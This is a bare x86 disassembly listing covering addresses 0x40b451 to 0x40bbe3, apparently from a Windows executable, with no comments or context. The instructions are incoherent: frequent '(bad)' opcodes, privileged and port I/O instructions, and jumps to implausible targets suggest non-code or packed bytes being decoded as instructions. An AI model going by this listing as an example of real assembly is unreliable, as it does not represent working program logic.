  40b451:	add    edx,DWORD PTR [eax+0x1eae62f7]
  40b457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b458:	or     eax,0xab42deaa
  40b45d:	pop    esp
  40b45e:	std    
  40b45f:	cmp    edx,DWORD PTR [ebx-0x6a9f4769]
  40b465:	aad    0x73
  40b467:	push   es
  40b468:	sbb    DWORD PTR [esi-0x71],edi
  40b46b:	push   es
  40b46c:	push   edi
  40b46d:	loop   0x40b49d
  40b46f:	jge    0x40b490
  40b471:	cmp    ebp,DWORD PTR [ebx+eax*1-0x4b6eb0ac]
  40b478:	sahf   
  40b479:	sti    
  40b47a:	mov    fs,eax
  40b47c:	shr    DWORD PTR [ecx+0x3314f673],0x5b
  40b483:	mov    eax,0xa0474de6
  40b488:	push   ecx
  40b489:	xchg   edi,eax
  40b48a:	add    eax,0xe2763b23
  40b48f:	cli    
  40b490:	cmp    bh,bl
  40b492:	test   al,0x19
  40b494:	test   bh,dh
  40b496:	adc    eax,0xffffff82
  40b499:	jg     0x40b4f6
  40b49b:	test   BYTE PTR [edi+0x43af0f59],ah
  40b4a1:	jbe    0x40b4a2
  40b4a3:	iret   
  40b4a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4a5:	mov    cl,0x2f
  40b4a7:	(bad)  
  40b4a8:	or     al,0xc9
  40b4aa:	jnp    0x40b48e
  40b4ac:	imul   ebx,DWORD PTR ds:0xf06afff9,0x12
  40b4b3:	pop    edx
  40b4b4:	mov    eax,0xd6a77307
  40b4b9:	mov    al,0x5d
  40b4bb:	and    eax,0xb6adb759
  40b4c0:	gs scas al,BYTE PTR es:[edi]
  40b4c2:	rcl    BYTE PTR [edx+0x34],cl
  40b4c5:	aas    
  40b4c6:	mov    esi,0xf6137b37
  40b4cb:	(bad)  
  40b4cc:	sar    BYTE PTR [ecx-0x31],cl
  40b4cf:	push   ebp
  40b4d0:	repz mov dl,0xad
  40b4d3:	scas   al,BYTE PTR es:[edi]
  40b4d4:	xchg   edi,eax
  40b4d5:	ja     0x40b4ae
  40b4d7:	lea    eax,[ebp+ebx*8+0x615f6605]
  40b4de:	cmp    ebp,eax
  40b4e0:	dec    edx
  40b4e1:	xor    dl,BYTE PTR [eax]
  40b4e3:	jns    0x40b53e
  40b4e5:	dec    eax
  40b4e6:	push   0xdf790069
  40b4eb:	jecxz  0x40b56a
  40b4ed:	mov    cl,0xa1
  40b4ef:	mov    al,ds:0x20fd81b3
  40b4f4:	xchg   DWORD PTR [edi-0x12],ebp
  40b4f7:	enter  0xa60e,0xec
  40b4fb:	jmp    0x2649:0x331d439a
  40b502:	cli    
  40b503:	dec    ebp
  40b504:	adc    BYTE PTR [esi-0x46],ch
  40b507:	add    BYTE PTR [edx+0x54],ch
  40b50a:	dec    ecx
  40b50b:	inc    eax
  40b50c:	push   0x38
  40b50e:	out    0xf7,al
  40b510:	dec    ebp
  40b511:	adc    esi,esp
  40b513:	mov    al,ds:0xb10d3aa9
  40b518:	mov    eax,0xa03d307
  40b51d:	mov    dh,0xfe
  40b51f:	push   ss
  40b520:	pop    es
  40b521:	and    esi,ebx
  40b523:	mov    edi,0x23330fe7
  40b528:	sahf   
  40b529:	push   esi
  40b52a:	mov    esi,0xb0d5fae3
  40b52f:	hlt    
  40b530:	xor    eax,eax
  40b532:	jnp    0x40b579
  40b534:	pop    edi
  40b535:	ja     0x40b58a
  40b537:	int    0x43
  40b539:	(bad)  [ecx]
  40b53b:	add    ebx,DWORD PTR [eax]
  40b53d:	pop    ecx
  40b53e:	test   al,0x8
  40b540:	loopne 0x40b522
  40b542:	int3   
  40b543:	sbb    al,0xd2
  40b545:	into   
  40b546:	repnz xor eax,0x6e90aa88
  40b54c:	dec    ecx
  40b54d:	xor    al,0xce
  40b54f:	sub    eax,0x5343c7c0
  40b554:	jb     0x40b5a4
  40b556:	adc    eax,0xe9260b51
  40b55b:	ret    0xe567
  40b55e:	aas    
  40b55f:	sbb    edi,ecx
  40b561:	adc    dl,BYTE PTR [ecx-0x73d8f929]
  40b567:	add    eax,0x8ac86bbf
  40b56c:	and    eax,0x7113c1a7
  40b571:	mov    ds:0x710ae2ee,al
  40b576:	fnstsw WORD PTR [ebx+ebx*1]
  40b579:	(bad)  
  40b57a:	jns    0x40b540
  40b57c:	ja     0x40b539
  40b57e:	ficomp WORD PTR ds:0xf614efb4
  40b584:	pop    ss
  40b585:	add    ebx,DWORD PTR [ebx]
  40b587:	popa   
  40b588:	and    BYTE PTR ss:[eax+0x2068d327],dl
  40b58f:	outs   dx,DWORD PTR ds:[esi]
  40b590:	xchg   BYTE PTR [ebp-0x43],bl
  40b593:	mov    dx,0x279
  40b597:	mov    BYTE PTR [edi-0x721e2c81],dh
  40b59d:	lea    edi,[eax-0xf8f876a]
  40b5a3:	mov    ebp,0xfd784ce9
  40b5a8:	enter  0xd3fb,0xdb
  40b5ac:	mov    ch,0x9
  40b5ae:	add    esp,edi
  40b5b0:	mov    ebp,0x9dc15f3e
  40b5b5:	imul   DWORD PTR [edi]
  40b5b7:	pop    edi
  40b5b8:	dec    esi
  40b5b9:	pop    esi
  40b5ba:	pop    ebx
  40b5bb:	adc    edi,DWORD PTR [esi-0x46]
  40b5be:	inc    esi
  40b5bf:	or     ebx,edx
  40b5c1:	fiadd  WORD PTR [edx-0x8]
  40b5c4:	mov    ch,0x60
  40b5c6:	shl    dh,1
  40b5c8:	push   es
  40b5c9:	cmp    eax,0x9d8e093a
  40b5ce:	inc    edx
  40b5cf:	cwde   
  40b5d0:	clc    
  40b5d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5d2:	add    ecx,DWORD PTR [edx]
  40b5d4:	leave  
  40b5d5:	or     DWORD PTR [ebp+0x400ad827],esp
  40b5db:	sub    ah,BYTE PTR [ecx+0x26]
  40b5de:	dec    esi
  40b5df:	rcl    ebx,cl
  40b5e1:	or     eax,0xbabd784d
  40b5e6:	retf   
  40b5e7:	inc    ebx
  40b5e8:	inc    ebp
  40b5e9:	push   edi
  40b5ea:	mov    BYTE PTR [esi+0x31eb1229],ah
  40b5f0:	lock je 0x40b5d2
  40b5f3:	inc    ebx
  40b5f4:	pop    esi
  40b5f5:	pop    eax
  40b5f6:	lods   eax,DWORD PTR ds:[esi]
  40b5f7:	cmp    bh,BYTE PTR [eax+eax*1+0x146cf9df]
  40b5fe:	cmp    edx,ebx
  40b600:	sbb    BYTE PTR [esi],bl
  40b602:	leave  
  40b603:	push   eax
  40b604:	or     al,0xed
  40b606:	fild   WORD PTR [edi]
  40b608:	aad    0x24
  40b60a:	bound  esi,QWORD PTR [ecx-0x38]
  40b60d:	or     BYTE PTR [edx+0x63],bh
  40b610:	enter  0xfc0b,0x8
  40b614:	xchg   esi,eax
  40b615:	jecxz  0x40b5cc
  40b617:	jecxz  0x40b5c3
  40b619:	aaa    
  40b61a:	mov    dh,0x58
  40b61c:	stos   BYTE PTR es:[edi],al
  40b61d:	fist   WORD PTR [eax]
  40b61f:	(bad)  
  40b620:	mov    eax,ds:0x73f5360d
  40b625:	sti    
  40b626:	fwait
  40b627:	sbb    ch,bh
  40b629:	std    
  40b62a:	or     esp,ebp
  40b62c:	jnp    0x40b5e4
  40b62e:	xchg   edi,eax
  40b62f:	ret    
  40b630:	pop    ds
  40b631:	xlat   BYTE PTR ds:[ebx]
  40b632:	xchg   edi,eax
  40b633:	cmp    DWORD PTR ds:0xeda1fae8,ecx
  40b639:	xor    DWORD PTR [edx+0x1518f521],0xffffffa1
  40b640:	inc    edi
  40b641:	cmp    eax,0x507df4e8
  40b646:	or     eax,0xba9e1ae4
  40b64b:	pop    ss
  40b64c:	xor    DWORD PTR [ebx+ebx*1-0x79d68849],eax
  40b653:	dec    esi
  40b654:	int    0xfa
  40b656:	fwait
  40b657:	xchg   DWORD PTR ds:0xf807f4fd,edi
  40b65d:	xchg   edx,eax
  40b65e:	jae    0x40b6ca
  40b660:	ss sbb al,0xe9
  40b663:	daa    
  40b664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b665:	js     0x40b6e0
  40b667:	retf   0xcf2c
  40b66a:	cwde   
  40b66b:	xlat   BYTE PTR ds:[ebx]
  40b66c:	mov    esi,0x9c2c7fd8
  40b671:	iret   
  40b672:	jge    0x40b695
  40b674:	pop    ecx
  40b675:	cmc    
  40b676:	mov    ecx,0xe25ea2b5
  40b67b:	addr16 push esi
  40b67d:	jg     0x40b636
  40b67f:	push   es
  40b680:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b681:	leave  
  40b682:	dec    esp
  40b683:	sti    
  40b684:	shld   ebx,edi,0xf1
  40b688:	dec    ebx
  40b689:	stos   BYTE PTR es:[edi],al
  40b68a:	pop    ds
  40b68b:	mov    ch,0xc2
  40b68d:	js     0x40b700
  40b68f:	pop    eax
  40b690:	pop    esi
  40b691:	dec    ebx
  40b692:	sbb    DWORD PTR [edi+ebx*8],edx
  40b695:	xor    BYTE PTR [ecx+0x12bed2ca],cl
  40b69b:	sbb    esp,DWORD PTR ds:0x2ee7f71e
  40b6a1:	out    dx,al
  40b6a2:	shl    BYTE PTR [esi+0x17],0x58
  40b6a6:	and    dh,BYTE PTR [edx+ecx*4-0x18]
  40b6aa:	enter  0xc66d,0x2a
  40b6ae:	pop    ecx
  40b6af:	mov    edx,0x6c4e25ef
  40b6b4:	fmul   QWORD PTR [ebp+0xb3300ff]
  40b6ba:	cwde   
  40b6bb:	sbb    BYTE PTR [ebp+0x4dfa2b7b],0xd7
  40b6c2:	and    eax,0x55fa98ce
  40b6c7:	xor    eax,0x5acfe1dc
  40b6cc:	pop    eax
  40b6cd:	adc    ch,BYTE PTR [ecx+0x34]
  40b6d0:	fiadd  DWORD PTR [esi+0x45695684]
  40b6d6:	jnp    0x40b68f
  40b6d8:	push   ebx
  40b6d9:	nop
  40b6da:	pop    edx
  40b6db:	xchg   ebx,eax
  40b6dc:	fild   DWORD PTR [edi+ebx*4+0x62444973]
  40b6e3:	dec    edi
  40b6e4:	popa   
  40b6e5:	xor    edi,esp
  40b6e7:	mov    ebx,0x5fd54a93
  40b6ec:	fisttp DWORD PTR [ebp-0x58]
  40b6ef:	sub    dh,bl
  40b6f1:	pop    edi
  40b6f2:	dec    ecx
  40b6f3:	jg     0x40b6c1
  40b6f5:	sbb    BYTE PTR [edi],ch
  40b6f7:	dec    eax
  40b6f8:	dec    esi
  40b6f9:	test   DWORD PTR [edi-0x5857f452],esi
  40b6ff:	sub    al,0x69
  40b701:	stos   BYTE PTR es:[edi],al
  40b702:	aad    0x2d
  40b704:	and    bh,BYTE PTR [edx-0x6c]
  40b707:	lods   eax,DWORD PTR ds:[esi]
  40b708:	pop    esi
  40b709:	dec    edi
  40b70a:	aad    0x9e
  40b70c:	xor    DWORD PTR [edi+ebx*8-0x17],esp
  40b710:	xor    edi,DWORD PTR [edi-0x46862250]
  40b716:	push   eax
  40b717:	(bad)  
  40b718:	iret   
  40b719:	fstp   QWORD PTR [esi-0x1510f5b3]
  40b71f:	fistp  QWORD PTR [ecx+0x48e78889]
  40b725:	mov    ecx,DWORD PTR [edx]
  40b727:	in     al,0x4c
  40b729:	jp     0x40b6e7
  40b72b:	push   edi
  40b72c:	icebp  
  40b72d:	ret    
  40b72e:	jp     0x40b6f5
  40b730:	fwait
  40b731:	cmovl  edx,esp
  40b734:	inc    BYTE PTR [edx+0x46]
  40b737:	jge    0x40b714
  40b739:	jle    0x40b6c9
  40b73b:	xor    edx,DWORD PTR [esi+ebx*4]
  40b73e:	mov    ds:0x7c6eb76e,eax
  40b743:	lahf   
  40b744:	aad    0x46
  40b746:	out    dx,al
  40b747:	and    BYTE PTR [edi-0x50ceefab],bh
  40b74d:	push   0x66
  40b74f:	xor    BYTE PTR [edi],bl
  40b751:	enter  0x8d0d,0x0
  40b755:	in     al,dx
  40b756:	adc    eax,DWORD PTR [eax-0x2b]
  40b759:	inc    edx
  40b75a:	(bad)  
  40b75b:	daa    
  40b75c:	adc    bh,ch
  40b75e:	dec    edi
  40b75f:	ret    
  40b760:	mov    WORD PTR [esi-0x563b51c1],ds
  40b766:	inc    eax
  40b767:	sbb    al,0xe1
  40b769:	jno    0x40b703
  40b76b:	jge    0x40b74e
  40b76d:	or     BYTE PTR ds:0x4e4d1c09,0xd5
  40b774:	push   edi
  40b775:	jbe    0x40b779
  40b777:	sub    ecx,ecx
  40b779:	inc    ebx
  40b77a:	dec    ecx
  40b77b:	pop    ecx
  40b77c:	pop    edi
  40b77d:	ss jnp 0x40b770
  40b780:	bound  eax,QWORD PTR [edi-0x403098d9]
  40b786:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b787:	leave  
  40b788:	mov    es,WORD PTR [eax]
  40b78a:	sub    BYTE PTR [edi+0x4d],dh
  40b78d:	mov    ecx,0x61a6a0d4
  40b792:	mov    dh,BYTE PTR [esi+0x12]
  40b795:	mov    esp,0x4b01c515
  40b79a:	mov    dl,0x65
  40b79c:	jle    0x40b72e
  40b79e:	lds    edx,FWORD PTR [esi+edi*4]
  40b7a1:	sti    
  40b7a2:	push   esi
  40b7a3:	shl    BYTE PTR [edi],cl
  40b7a5:	gs mov esp,0x890c678f
  40b7ab:	xchg   edx,eax
  40b7ac:	cmp    BYTE PTR ds:0xe1820de8,cl
  40b7b2:	cmc    
  40b7b3:	test   al,ah
  40b7b5:	push   ss
  40b7b6:	outs   dx,DWORD PTR ds:[esi]
  40b7b7:	fstp   QWORD PTR [esi]
  40b7b9:	std    
  40b7ba:	out    0x76,al
  40b7bc:	xchg   esi,eax
  40b7bd:	inc    edi
  40b7be:	or     al,0x96
  40b7c0:	add    DWORD PTR [edx],0x45
  40b7c3:	aaa    
  40b7c4:	add    BYTE PTR [ecx],bl
  40b7c6:	jmp    0x40b808
  40b7c8:	imul   eax,DWORD PTR [ecx],0x3d
  40b7cb:	call   ebx
  40b7cd:	pop    edx
  40b7ce:	icebp  
  40b7cf:	fwait
  40b7d0:	adc    BYTE PTR [esi],dl
  40b7d2:	dec    edx
  40b7d3:	out    dx,al
  40b7d4:	lea    edx,[eax+0x7f]
  40b7d7:	adc    eax,eax
  40b7d9:	xor    eax,0xe9f61178
  40b7de:	ret    0x7bcd
  40b7e1:	ficomp DWORD PTR [esi+0x715c6481]
  40b7e7:	aam    0x6b
  40b7e9:	loopne 0x40b7fa
  40b7eb:	add    eax,esp
  40b7ed:	rol    DWORD PTR [ecx-0x3bcceca8],cl
  40b7f3:	(bad)  
  40b7f4:	and    DWORD PTR [edi],ebp
  40b7f6:	mov    ah,0xd4
  40b7f8:	xlat   BYTE PTR ds:[ebx]
  40b7f9:	loope  0x40b7d9
  40b7fb:	cmp    eax,0xe7fec840
  40b800:	add    bh,ch
  40b802:	cmp    eax,0x3285d57a
  40b807:	inc    esi
  40b808:	sub    BYTE PTR [edx+edi*4],cl
  40b80b:	bound  eax,QWORD PTR [edi+0x1186548f]
  40b811:	jp     0x40b871
  40b813:	or     ch,0xaa
  40b816:	ficom  WORD PTR [ecx-0x6713326c]
  40b81c:	stc    
  40b81d:	clc    
  40b81e:	xor    BYTE PTR [ebx+0x66b22a2a],0xe4
  40b825:	mov    ch,0x91
  40b827:	pop    edi
  40b828:	shl    DWORD PTR [esi],0xc5
  40b82b:	enter  0x1506,0x8d
  40b82f:	xlat   BYTE PTR ds:[ebx]
  40b830:	or     al,0x5c
  40b832:	std    
  40b833:	mov    ds:0xf6023e99,eax
  40b838:	push   ds
  40b839:	fnstenv [eax+ebp*8]
  40b83c:	dec    DWORD PTR [eax+0x2c]
  40b83f:	inc    eax
  40b840:	(bad)  
  40b841:	push   edx
  40b842:	sti    
  40b843:	jnp    0x40b7f5
  40b845:	call   0x2d3ae251
  40b84a:	mov    eax,ds:0x74fd4bc3
  40b84f:	imul   edi,DWORD PTR [ebx-0x43],0xde1967c4
  40b856:	bound  edx,QWORD PTR [edi-0x15]
  40b859:	div    BYTE PTR [ecx+0x34cfe8f3]
  40b85f:	mov    cs,WORD PTR [eax]
  40b861:	jle    0x40b8c0
  40b863:	or     bh,BYTE PTR [esi-0x57661fbb]
  40b869:	invlpg BYTE PTR [edi-0x1ff9afa3]
  40b870:	jmp    0x9ef8cc2c
  40b875:	out    0xb5,eax
  40b877:	fadd   QWORD PTR [eax]
  40b879:	xchg   ebx,eax
  40b87a:	in     al,0x59
  40b87c:	test   BYTE PTR [eax-0x3e],bl
  40b87f:	pop    edi
  40b880:	mov    ecx,0x89f2be70
  40b885:	sar    DWORD PTR [ecx],cl
  40b887:	or     BYTE PTR [esi+0x1fae93e3],bh
  40b88d:	sahf   
  40b88e:	lea    eax,[edi]
  40b890:	mov    al,0xfc
  40b892:	xchg   ebx,eax
  40b893:	rcl    dl,cl
  40b895:	xchg   ebp,eax
  40b896:	dec    eax
  40b897:	pusha  
  40b898:	ja     0x40b884
  40b89a:	pop    es
  40b89b:	dec    ecx
  40b89c:	add    DWORD PTR [ecx+edx*2+0x55],esi
  40b8a0:	mov    ah,0x1f
  40b8a2:	xor    BYTE PTR [ebp+0x70],al
  40b8a5:	push   edx
  40b8a6:	jge    0x40b896
  40b8a8:	xchg   ebx,eax
  40b8a9:	sbb    ebx,edi
  40b8ab:	cmp    dl,dl
  40b8ad:	repz and cl,bh
  40b8b0:	pop    ebx
  40b8b1:	imul   edi,DWORD PTR [ebp+0x78],0x19
  40b8b5:	push   ecx
  40b8b6:	xchg   BYTE PTR [eax+edi*4+0x53],bh
  40b8ba:	(bad)  
  40b8bb:	adc    al,0x85
  40b8bd:	jl     0x40b922
  40b8bf:	sahf   
  40b8c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8c1:	sbb    eax,0x82f124ff
  40b8c6:	push   eax
  40b8c7:	or     eax,0x64b63f94
  40b8cc:	mov    edx,0x12013068
  40b8d1:	pop    esp
  40b8d2:	xchg   ebx,eax
  40b8d3:	xor    ch,cl
  40b8d5:	leave  
  40b8d6:	call   0x8944846e
  40b8db:	mov    ah,0xf4
  40b8dd:	out    0x26,al
  40b8df:	hlt    
  40b8e0:	adc    al,0x1e
  40b8e2:	dec    esp
  40b8e3:	test   esi,edx
  40b8e5:	aam    0x32
  40b8e7:	add    al,0xb9
  40b8e9:	jmp    0x523a:0x2237b1dd
  40b8f0:	into   
  40b8f1:	inc    edi
  40b8f2:	jns    0x40b932
  40b8f4:	jno    0x40b971
  40b8f6:	adc    eax,0x936132a0
  40b8fb:	jns    0x40b937
  40b8fd:	imul   esi,DWORD PTR [edi],0x3a36f6b9
  40b903:	jnp    0x40b897
  40b905:	(bad)  
  40b906:	je     0x40b8f9
  40b908:	ja     0x40b93a
  40b90a:	hlt    
  40b90b:	pop    ecx
  40b90c:	cmp    DWORD PTR [eax-0x7b],ecx
  40b90f:	fnclex 
  40b911:	lahf   
  40b912:	mov    al,ds:0x8b7eea84
  40b917:	(bad)
  40b91a:	inc    esp
  40b91b:	push   ds
  40b91c:	mov    ah,0x9b
  40b91e:	aaa    
  40b91f:	into   
  40b920:	test   eax,0xcb9c8339
  40b925:	imul   edx,DWORD PTR [edx+0x620be827],0x4baa870
  40b92f:	hlt    
  40b930:	call   0x5f7c935e
  40b935:	cmp    eax,DWORD PTR [ebx+0x3f]
  40b938:	inc    edx
  40b939:	pop    esi
  40b93a:	xchg   edi,eax
  40b93b:	cli    
  40b93c:	push   esp
  40b93d:	(bad)  
  40b93e:	xchg   esp,eax
  40b93f:	and    bl,BYTE PTR [ecx+0x4e7e1e5e]
  40b945:	mov    esp,0xb8f266c3
  40b94a:	jecxz  0x40b95b
  40b94c:	push   0x60
  40b94e:	and    DWORD PTR [ebx+0xd],0x15
  40b952:	and    DWORD PTR [ebx+0x642d1f3],0xffffff96
  40b959:	pop    ds
  40b95a:	shr    cl,1
  40b95c:	adc    ebp,ecx
  40b95e:	in     al,dx
  40b95f:	mov    eax,0xd81a21a2
  40b964:	xchg   DWORD PTR ds:[esi+0xa],edi
  40b968:	std    
  40b969:	das    
  40b96a:	mov    al,0x65
  40b96c:	jl     0x40b957
  40b96e:	mov    edi,0xdccfcfd
  40b973:	enter  0xa718,0x6c
  40b977:	pop    ds
  40b978:	js     0x40b963
  40b97a:	icebp  
  40b97b:	js     0x40b928
  40b97d:	es or  al,0xb9
  40b980:	pop    ss
  40b981:	inc    ecx
  40b982:	push   edi
  40b983:	jb     0x40b94c
  40b985:	es jbe 0xd473f8a0
  40b98c:	mov    ebp,?
  40b98e:	lock (bad) 
  40b990:	retf   
  40b991:	loopne 0x40b9e0
  40b993:	jne    0x40b95a
  40b995:	cli    
  40b996:	and    al,0x4a
  40b998:	xor    edx,DWORD PTR [eax-0xf]
  40b99b:	in     eax,0xac
  40b99d:	sbb    eax,0xcc0cb500
  40b9a2:	or     al,0x40
  40b9a4:	(bad)  
  40b9a5:	jmp    0x40ba20
  40b9a7:	sti    
  40b9a8:	or     DWORD PTR [eax-0x5e],edi
  40b9ab:	call   0xd3816b0a
  40b9b0:	out    dx,al
  40b9b1:	or     ebx,DWORD PTR [ecx+0xa]
  40b9b4:	ret    
  40b9b5:	daa    
  40b9b6:	xor    dl,BYTE PTR [ebx-0x39498169]
  40b9bc:	cmp    esi,DWORD PTR [edi+0x1dff5af3]
  40b9c2:	adc    DWORD PTR [ecx],esp
  40b9c4:	add    BYTE PTR [ebx+ebx*4-0x8],ch
  40b9c8:	scas   eax,DWORD PTR es:[edi]
  40b9c9:	and    eax,0xa7b65324
  40b9ce:	inc    esp
  40b9cf:	mul    DWORD PTR [ebx]
  40b9d1:	dec    edx
  40b9d2:	pushf  
  40b9d3:	std    
  40b9d4:	push   esp
  40b9d5:	(bad)  [edx]
  40b9d7:	adc    DWORD PTR [edx-0x5036f601],0xac4df244
  40b9e1:	and    eax,0x551ea72
  40b9e6:	enter  0xc2f9,0xf5
  40b9ea:	enter  0xc1b0,0x3c
  40b9ee:	es jl  0x40b97d
  40b9f1:	test   eax,0x5802a0ab
  40b9f6:	popf   
  40b9f7:	mov    esp,?
  40b9f9:	pop    esi
  40b9fa:	push   0x1
  40b9fc:	inc    ecx
  40b9fd:	les    esp,FWORD PTR [edi]
  40b9ff:	repz (bad) 
  40ba02:	cmp    BYTE PTR [edx+0x4c],bh
  40ba05:	fwait
  40ba06:	pop    esi
  40ba07:	outs   dx,BYTE PTR ds:[esi]
  40ba08:	adc    eax,0xf2efc87
  40ba0d:	add    eax,0x9ccb61b9
  40ba12:	xor    eax,0x194b19b5
  40ba17:	inc    esp
  40ba18:	stos   BYTE PTR es:[edi],al
  40ba19:	stos   DWORD PTR es:[edi],eax
  40ba1a:	mov    bl,0xf2
  40ba1c:	pop    eax
  40ba1d:	lahf   
  40ba1e:	jmp    FWORD PTR [edx+0x59312134]
  40ba24:	and    esi,edx
  40ba26:	fdivr  QWORD PTR [edi-0x2dae6b64]
  40ba2c:	mov    eax,0xdd0c0b85
  40ba31:	push   cs
  40ba32:	cld    
  40ba33:	mov    eax,0x3c4d019d
  40ba38:	stos   DWORD PTR es:[edi],eax
  40ba39:	add    DWORD PTR [eax],esi
  40ba3b:	repnz dec ebp
  40ba3d:	mov    BYTE PTR [ebx-0xf],0xfc
  40ba41:	pusha  
  40ba42:	push   0xb0bca494
  40ba47:	jno    0x40baa3
  40ba49:	sbb    dl,BYTE PTR [ecx-0x2e696779]
  40ba4f:	into   
  40ba50:	loope  0x40ba0c
  40ba52:	dec    edx
  40ba53:	and    bl,ch
  40ba55:	push   esp
  40ba56:	loop   0x40ba1f
  40ba58:	xor    BYTE PTR [ebx+edi*2-0x17],bh
  40ba5c:	xlat   BYTE PTR ds:[ebx]
  40ba5d:	xor    esp,DWORD PTR [edi-0x66360bf3]
  40ba63:	in     al,dx
  40ba64:	addr16 popf 
  40ba66:	cli    
  40ba67:	push   eax
  40ba68:	(bad)  
  40ba69:	shl    BYTE PTR [esi-0x30],1
  40ba6c:	ins    BYTE PTR es:[edi],dx
  40ba6d:	retf   
  40ba6e:	rcl    BYTE PTR [esi-0x2d1e6448],cl
  40ba74:	(bad)  
  40ba75:	call   esi
  40ba77:	pop    edx
  40ba78:	push   0xf1ea814d
  40ba7d:	adc    DWORD PTR [eax],esp
  40ba7f:	cmpxchg BYTE PTR [esi+0x5e],ch
  40ba83:	or     BYTE PTR [esi+0x5],cl
  40ba86:	adc    BYTE PTR es:[eax+0x1c],0x19
  40ba8b:	mov    ch,0x52
  40ba8d:	adc    eax,0xdbe6e891
  40ba92:	rcl    ch,cl
  40ba94:	sbb    ch,BYTE PTR [eax-0x73885725]
  40ba9a:	je     0x40bb0e
  40ba9c:	mov    cl,0xb9
  40ba9e:	(bad)  
  40ba9f:	into   
  40baa0:	(bad)  
  40baa2:	and    BYTE PTR [edi-0x76],cl
  40baa5:	inc    eax
  40baa6:	push   eax
  40baa7:	add    dl,al
  40baa9:	mov    eax,0x2b302224
  40baae:	jge    0x40badd
  40bab0:	in     eax,0xda
  40bab2:	xchg   ebp,eax
  40bab3:	dec    ebx
  40bab4:	call   0x23bfc589
  40bab9:	loope  0x40bacb
  40babb:	stos   DWORD PTR es:[edi],eax
  40babc:	mov    dh,0xe3
  40babe:	fnstenv [edx-0x4b]
  40bac1:	int3   
  40bac2:	inc    ebx
  40bac3:	push   edx
  40bac4:	stc    
  40bac5:	and    eax,0xa0a30a2a
  40baca:	cmp    BYTE PTR [ecx],bl
  40bacc:	mov    dh,0x70
  40bace:	jno    0x40bb15
  40bad0:	jne    0x40bad9
  40bad2:	call   0x853:0x54498aa0
  40bad9:	loope  0x40ba98
  40badb:	jcxz   0x40babe
  40bade:	jl     0x40bab5
  40bae0:	add    dh,cl
  40bae2:	push   edx
  40bae3:	mov    esp,0x65877712
  40bae8:	add    BYTE PTR ds:[esi-0x11],bl
  40baec:	data16 stc 
  40baee:	jmp    DWORD PTR [ebx]
  40baf0:	jp     0x40bb68
  40baf2:	out    0xe6,al
  40baf4:	mov    ?,ebx
  40baf6:	mov    ecx,0xca45df34
  40bafb:	ror    BYTE PTR [ebx-0x515b75cc],0x2b
  40bb02:	ins    DWORD PTR es:[edi],dx
  40bb03:	mov    ebx,0x61697ed9
  40bb08:	mov    edi,0xfb297dea
  40bb0d:	loop   0x40bb32
  40bb0f:	sub    dh,BYTE PTR [ebx+0x50]
  40bb12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb13:	inc    ebp
  40bb14:	xor    eax,0xa4b9a036
  40bb19:	out    dx,al
  40bb1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb1b:	lds    esp,FWORD PTR [ecx+eiz*1-0xa86c6fd]
  40bb22:	aas    
  40bb23:	scas   eax,DWORD PTR es:[edi]
  40bb24:	lds    ebx,FWORD PTR [ebp-0x4a]
  40bb27:	loopne 0x40bb5e
  40bb29:	imul   esp,DWORD PTR [esi-0x75843f14],0xffffff80
  40bb30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb31:	aam    0x2d
  40bb33:	js     0x40bb48
  40bb35:	test   eax,0xc687f5af
  40bb3a:	cdq    
  40bb3b:	sbb    eax,0xc755bea3
  40bb40:	leave  
  40bb41:	xor    DWORD PTR [ecx+edx*2],0x5f
  40bb45:	push   cs
  40bb46:	adc    al,0x15
  40bb48:	out    0x6b,al
  40bb4a:	(bad)  
  40bb4b:	pop    edx
  40bb4c:	shl    DWORD PTR [ebp+0x58768e2f],0xf6
  40bb53:	(bad)  
  40bb54:	ja     0x40bb2d
  40bb56:	ins    BYTE PTR es:[edi],dx
  40bb57:	jae    0x40bb47
  40bb59:	mov    ebx,0x3879b44
  40bb5e:	retf   0xb120
  40bb61:	inc    ebp
  40bb62:	add    edi,DWORD PTR [eax]
  40bb64:	popa   
  40bb65:	rol    DWORD PTR [ebp-0x4d],0xf1
  40bb69:	push   esp
  40bb6a:	xchg   edx,eax
  40bb6b:	and    ecx,esp
  40bb6d:	or     al,0x1f
  40bb6f:	adc    al,0x97
  40bb71:	jmp    0x40bbdc
  40bb73:	out    0xb2,eax
  40bb75:	inc    esp
  40bb76:	jle    0x40bbaf
  40bb78:	mov    cl,0x73
  40bb7a:	cmp    eax,DWORD PTR [edi+0x680e7ce0]
  40bb80:	jecxz  0x40bbc5
  40bb82:	cmp    dh,BYTE PTR [ebp+0x2c]
  40bb85:	pop    esp
  40bb86:	mov    ebp,0x463094e0
  40bb8b:	jecxz  0x40bb36
  40bb8d:	lahf   
  40bb8e:	call   0x9ef318b9
  40bb93:	test   BYTE PTR [esi],dl
  40bb95:	lock je 0x40bbcc
  40bb98:	jns    0x40bb39
  40bb9a:	ins    DWORD PTR es:[edi],dx
  40bb9b:	stos   DWORD PTR es:[edi],eax
  40bb9c:	int    0x2d
  40bb9e:	jmp    0x40bb77
  40bba0:	ficomp WORD PTR [ecx-0x2f]
  40bba3:	jbe    0x40bbca
  40bba5:	and    eax,0xffb6f287
  40bbaa:	jmp    0x6bf4b0c9
  40bbaf:	cmp    DWORD PTR [bx+di],eax
  40bbb2:	lds    eax,FWORD PTR [edi]
  40bbb4:	div    ebx
  40bbb6:	xchg   ebp,eax
  40bbb7:	rcl    DWORD PTR [ecx+0x4eaedb5e],0xb
  40bbbe:	push   es
  40bbbf:	repz xor eax,0x765aca85
  40bbc5:	push   es
  40bbc6:	xor    esi,DWORD PTR ds:0xabd3136
  40bbcc:	test   al,0xa5
  40bbce:	call   0x991e:0x53ff51d0
  40bbd5:	jnp    0x40bbe5
  40bbd7:	push   edi
  40bbd8:	sub    bh,bl
  40bbda:	pushf  
  40bbdb:	inc    eax
  40bbdc:	push   ss
  40bbdd:	fild   QWORD PTR [eax+0x1e28ad45]
  40bbe3:	ret    0xe7b5
